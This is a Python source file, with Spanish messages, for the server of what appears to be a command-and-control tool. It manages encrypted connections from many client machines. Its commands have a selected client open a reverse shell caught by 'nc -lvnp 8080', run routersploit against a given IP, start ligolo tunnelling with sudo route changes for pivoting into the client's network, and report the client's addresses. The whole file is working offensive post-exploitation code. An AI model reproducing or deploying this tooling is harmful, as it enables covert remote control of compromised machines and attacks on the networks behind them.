import rsa
import socket
import threading
import time
from subprocess import Popen, PIPE
from libs.personal_prompt import PersonalPrompt
from libs.server_config import ServerConfig
from os import system, name, walk, _exit, getcwd, chdir
from cryptography.fernet import Fernet

class ServerManage:
    def __init__(self, global_vars_instance):
        self.clients = []
        self.identificador = {}
        self.identificador_rsa = {}
        self.identificador_crypto_key = {}

        self.global_vars_instance = global_vars_instance

        self.s = None

        self.select_user = None
        self.select_user_rsa = None
        self.select_user_socket = None
        self.select_user_crypto_key = None

        self.personal_prompt = PersonalPrompt()
        self.server_func = ServerConfig()

        self.server_crypto_key = None

        self.commands_server = {
            "shell": self._reverse_shell,
            "clear": self._clearscreen,
            "help": self._help,
            "users": self._get_users,
            "select": self._select_user,
            "close": self._close_client,
            "unselect": self._unselect,
            "!": self._execute_command,
            "test": self._test,
            "routersploit": self._routersploit,
            "gethostname": self._get_hostname,
            "route_list": self._route_list,
            "route_add": self._route_add,
            "route_del": self._route_del,
            "ligolo": self._ligolo_start,
            "ligolo_stop": self._ligolo_stop,
        }

    def encrypt_data_rsa(self, data, rsa_pub):
        data_encoding = None
        if not (type(data)) == bytes:
            data_encoding = data.encode('ascii')
        else:
            data_encoding = data
        data_encrypted = rsa.encrypt(data_encoding, rsa_pub)
        return data_encrypted
    
    def decrypt_data_rsa(self, data):
        data_decrypted_undecoding = rsa.decrypt(data, self.global_vars_instance.get_rsa_priv())
        data_decrypted = data_decrypted_undecoding.decode("ascii")
        return str(data_decrypted)

    def encrypt_data_fernet(self, data, user_crypto_key):
        fernet = Fernet(user_crypto_key)
        data_encoding = None
        if not (type(data)) == bytes:
            data_encoding = data.encode('ascii')
        else:
            data_encoding = data
        encrypt_data = fernet.encrypt(data_encoding)
        return encrypt_data

    def decrypt_data_fernet(self, data):
        fernet = Fernet(self.server_crypto_key)
        decrypt_data = fernet.decrypt(data)
        return str(decrypt_data.decode("ascii"))

    def server_data_recv(self, sc, user_recive, addr):
        while True:
            try:
                recv_unprocess = sc.recv(2048)
                if len(recv_unprocess) == None or len(recv_unprocess) == 0:
                    self.client_close(sc, addr, user_recive, False)
                else:
                    try:
                        recv = self.decrypt_data_fernet(recv_unprocess)
                        if(recv == "pong"):
                            print("\033[34m[INFO]\033[0m Pong del cliente {0} .".format(user_recive))
                        else:
                            print("\n{0}".format(recv))
                    except Exception as error:
                        self.client_close(sc, addr, user_recive, False)
            except Exception as error:
                break

    def client_close(self, sc, addr, user_recive, status):
        if not status:
            if self.select_user == user_recive:
                self.personal_prompt.prompt_change_status("server")
                self.select_user = None
            else:
                del(self.identificador[user_recive])
                del(self.identificador_rsa[user_recive])
                del(self.identificador_crypto_key[user_recive])
                numero_de_conexion_clients = self.clients.index(sc)
                del(self.clients[numero_de_conexion_clients])
                sc.shutdown(socket.SHUT_RDWR)
                sc.close()
                print("\n\033[1m\033[34m[*]\033[0m" + " \033[31mCerrando\033[0m conexion con \033[35m{0} ({1})\033[0m".format(addr, user_recive))
        else:
            if self.select_user == user_recive:
                self.personal_prompt.prompt_change_status("server")
                self.select_user = None
            else:
                del(self.identificador[user_recive])
                del(self.identificador_rsa[user_recive])
                user_crypto_key = self.identificador_crypto_key[user_recive]
                data_encrypted = self.encrypt_data_fernet("quit", user_crypto_key)
                sc.send(bytearray(data_encrypted))
                del(self.identificador_crypto_key[user_recive])
                numero_de_conexion_clients = self.clients.index(sc)
                del(self.clients[numero_de_conexion_clients])
                sc.shutdown(socket.SHUT_RDWR)
                sc.close()
                print("\n\033[1m\033[34m[*]\033[0m" + " \033[31mCerrando\033[0m conexion con \033[35m{0} ({1})\033[0m".format(addr, user_recive))

    def data_accept_user(self, sc, addr, user_recive, user_rsa_pub, user_crypto_key):
        if user_recive in self.identificador:
            data_encrypted = self.encrypt_data_fernet("quit", user_crypto_key)
            self.select_user_socket.send(bytearray(data_encrypted))
            print('\n\033[1m\033[34m[*]\033[0m' + ' \033[2m\033[31mBloqueando\033[0m\033[2m conexion doble al servidor \033[35m{0}\033[0m'.format(addr))
        else:
            print("\n\033[1m\033[34m[*]\033[0m Conexion \033[32mestablecida\033[0m con \033[35m{0}\033[0m".format(addr))
            self.clients.append(sc)
            t2 = threading.Thread(target=self.server_data_recv, args=(sc, user_recive, addr,))
            t2.start()
            self.identificador[user_recive] = sc
            self.identificador_rsa[user_recive] = user_rsa_pub
            self.identificador_crypto_key[user_recive] = user_crypto_key
        return
 
    def server_stop(self):
        self.identificador.clear()
        self.s.close()
        return

    def server_data_handler(self, server_inp):
        if not server_inp:
            return
        
        sv_command = server_inp.split()
        if len(sv_command) >= 2:
            try:
                self.commands_server.get(sv_command[0])(sv_command[1:])
            except(TypeError):
                print("\033[31m[ERROR]\033[0m Comando desconocido o mal utilizado, por favor lea la informacion con help .")
                pass
        else:
            try:
                self.commands_server.get(sv_command[0])()
            except(TypeError):
                print("\033[31m[ERROR]\033[0m Comando desconocido o mal utilizado, por favor lea la informacion con help .")
                pass
        return

    def server_accept_handler(self):
        while True:
            try:
                sc, addr = self.s.accept()
                data_accept = sc.recv(2048).decode('ascii')
                if data_accept == "user__":
                    user_recive = sc.recv(2048).decode('ascii')

                    user_rsa_pub_unprocess = sc.recv(2048)
                    user_rsa_pub = rsa.PublicKey.load_pkcs1(user_rsa_pub_unprocess, format='DER')

                    server_rsa_pub_unprocess = self.global_vars_instance.get_rsa_pub()
                    server_rsa_pub = server_rsa_pub_unprocess.save_pkcs1(format='DER')
                    sc.send(server_rsa_pub)

                    user_crypto_key_crypted = sc.recv(2048)
                    user_crypto_key = self.decrypt_data_rsa(user_crypto_key_crypted)

                    data_encrypted = self.encrypt_data_rsa(self.server_crypto_key, user_rsa_pub)
                    sc.send(bytearray(data_encrypted))

                    self.data_accept_user(sc, addr, user_recive, user_rsa_pub, user_crypto_key)
                else:
                    sc.shutdown(socket.SHUT_RDWR)
                    sc.close()
            except KeyboardInterrupt:
                self.s.close()
                break
            except(OSError):
                break
        print(" ")
        return

    def server_start(self, ip, port):
        global user_recive
        user_recive = None

        self.server_crypto_key = Fernet.generate_key()

        print("\033[34m[INFO]\033[0m \033[32mEncendiendo\033[0m el servidor ...")
        print("\033[34m[INFO]\033[0m Completado.")

        print("\033[34m[INFO]\033[0m \033[32mConfigurando\033[0m interfaz para ligolo ...")
        system("sudo ip tuntap add user $USER mode tun ligolo")
        system("sudo ip link set ligolo up")
        print("\033[34m[INFO]\033[0m Completado.")

        port_process = int(port)

        Popen("kitty", start_new_session=True)
        time.sleep(3)

        try:
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s.bind((ip, port_process))
            self.s.listen(10)
        except:
            print("\033[31m[ERROR]\033[0m Error en el puerto usado")
            return

        t1 = threading.Thread(target=self.server_accept_handler, args=())
        t1.start()

        while True:
            try:
                server_inp = input(self.personal_prompt.prompt())
                self.server_data_handler(server_inp)
            except(EOFError):
                break
        self.server_stop()
        return
    
    def _clearscreen(self):
        system('clear')
        return
    
    def _help(self):
        return print("""

        \033[0mINFORMACION DE COMANDOS SERVER:
        \033[31m========================\033[0m
        \033[34m- help | Show command information.
        - clear | Clear screen.
        - users | Get users data.
        - close <user> | Disconnect user.
        - select <user> | Select user.
        - unselect | Unselect user.
        - ! <command> | Execute system commands.
        - route_list | List of ip route.
        - route_add <iprange> | Add ip range route to interface.
        - route_del <iprange> | Remove ip range route from interface
                     
        \033[0mINFORMACION DE COMANDOS CLIENTE:
        \033[31m========================\033[0m
        \033[34m- test <msg> | Send message to client.
        - shell | Generate client reverse shell.
        - gethostname | Get ip's from client inferface's.
        - routersploit <ip> | Execute routersploit in client.
        - ligolo | Start ligolo in client.
        - ligolo_close | Close ligolo from client.

        \033[0m""")

    def _get_clients(self):
        print("Clientes conectados {}".format(len(self.clients)))
        return

    def _get_users(self):
        print("""

        \033[0mLISTA DE USUARIOS:
        \033[31m========================\033[0m
        \033[34m""")

        set_num = 0

        for user in self.identificador.keys():
            socket = self.identificador[user]
            get_ip = str(socket.getpeername()).replace("(", "").replace(")", "").replace("'", "").replace(",", "").split()
            print("\t- [{0}] {1} IP: {2} PORT: {3}".format(set_num, user, get_ip[0], get_ip[1]))
            set_num +=1

        print("\033[0m")
        return
    
    def _select_user(self, param):
        param_process = ' '.join(param)
        if len(param) != 1:
                print("\033[31m[ERROR]\033[0m El comando no acepta tantos argumentos loco")
                return
        
        try:
            user_in_number = int(param[0])
            identificador_to_list = list(self.identificador.keys())
            param[0] = identificador_to_list[user_in_number]
        except:
            pass

        if param[0] in self.identificador:
            self.select_user = param[0]
            self.select_user_rsa = self.identificador_rsa[param[0]]
            self.select_user_socket = self.identificador[param[0]]
            self.select_user_crypto_key = self.identificador_crypto_key[param[0]]
            self.personal_prompt.prompt_change_status("withuser {0}".format(param[0]))
            print("\033[1m\033[34m[*]\033[0m Seleccionado usuario \033[32m\033[0m\033[35m{0}\033[0m".format(param[0]))
            return
        else:
            print("\033[31m[ERROR]\033[0m Este usuario no esta conectado")
            return
    
    def _unselect(self):
        self.select_user = None
        self.select_user_rsa = None
        self.select_user_crypto_key = None
        self.personal_prompt.prompt_change_status("server")
        return

    def _close_client(self, param):
        param_process = ' '.join(param)

        if param_process in self.identificador:
            sc = self.identificador[param_process]
            get_ip = str(sc.getsockname()).replace("(", "").replace(")", "").replace("'", "").replace(",", "").split()
            addr = get_ip[0]
            self.client_close(sc, addr, param_process, True)
        else:
            print("\033[31m[ERROR]\033[0m El cliente proporcionado no esta conectado al servidor")
            return
    
    def _execute_command(self, param):
        param_process = ' '.join(param)
        system(param_process)
        return
    
    def _test(self, param):
        param_process = ' '.join(param)
        if(self.select_user == None):
            print("\033[31m[ERROR]\033[0m No hay ningun cliente seleccionado")
        else:
            data_encrypted = self.encrypt_data_fernet(param_process, self.select_user_crypto_key)
            self.select_user_socket.send(bytearray(data_encrypted))
        return

    def _reverse_shell(self):
        if(self.select_user == None):
            print("\033[31m[ERROR]\033[0m No hay ningun cliente seleccionado")
        else:
            data_encrypted = self.encrypt_data_fernet("rev_shell", self.select_user_crypto_key)
            self.select_user_socket.send(bytearray(data_encrypted))
            system("nc -lvnp 8080")
            data_encrypted = self.encrypt_data_fernet("close_rev_shell", self.select_user_crypto_key)
            self.select_user_socket.send(bytearray(data_encrypted))
        return

    def _get_hostname(self):
        if(self.select_user == None):
            print("\033[31m[ERROR]\033[0m No hay ningun cliente seleccionado")
        else:
            data_encrypted = self.encrypt_data_fernet("get_hostname", self.select_user_crypto_key)
            self.select_user_socket.send(bytearray(data_encrypted))
        return

    def _routersploit(self, param):
        if len(param) != 1:
                print("\033[31m[ERROR]\033[0m El comando no acepta tantos argumentos loco")
                return
        if(self.select_user == None):
            print("\033[31m[ERROR]\033[0m No hay ningun cliente seleccionado")
        else:
            if (len(param) >= 1):
                data_encrypted = self.encrypt_data_fernet("routersploit {0}".format(param[0]), self.select_user_crypto_key)
                self.select_user_socket.send(bytearray(data_encrypted))
                print("\033[34m[INFO]\033[0m Esperando respuesta ...")
                recv_unprocess = self.select_user_socket.recv(60000)
                recv = self.decrypt_data_fernet(recv_unprocess)
                print(recv)
                return
            else:
                print("\033[31m[ERROR]\033[0m No se ha proporcionado ninguna ip")
        return
    
    def _route_list(self):
        system("ip route list")
        return
    
    def _route_add(self, param):
        if len(param) != 1:
                print("\033[31m[ERROR]\033[0m El comando no acepta tantos argumentos loco")
                return
        system("sudo ip route add {0} dev ligolo".format(param[0]))
        self.global_vars_instance.add_item_to_list_of_routes_for_ligolo(param[0])
        return
    
    def _route_del(self, param):
        if len(param) != 1:
                print("\033[31m[ERROR]\033[0m El comando no acepta tantos argumentos loco")
                return
        system("sudo ip route del {0} dev ligolo".format(param[0]))
        self.global_vars_instance.del_item_to_list_of_routes_for_ligolo(param[0])
        return

    def _ligolo_start(self):
        if(self.select_user == None):
            print("\033[31m[ERROR]\033[0m No hay ningun cliente seleccionado")
        else:
            data_encrypted = self.encrypt_data_fernet("ligolo", self.select_user_crypto_key)
            self.select_user_socket.send(bytearray(data_encrypted))
        return

    def _ligolo_stop(self):
        if(self.select_user == None):
            print("\033[31m[ERROR]\033[0m No hay ningun cliente seleccionado")
        else:
            data_encrypted = self.encrypt_data_fernet("ligolo_close", self.select_user_crypto_key)
            self.select_user_socket.send(bytearray(data_encrypted))
        return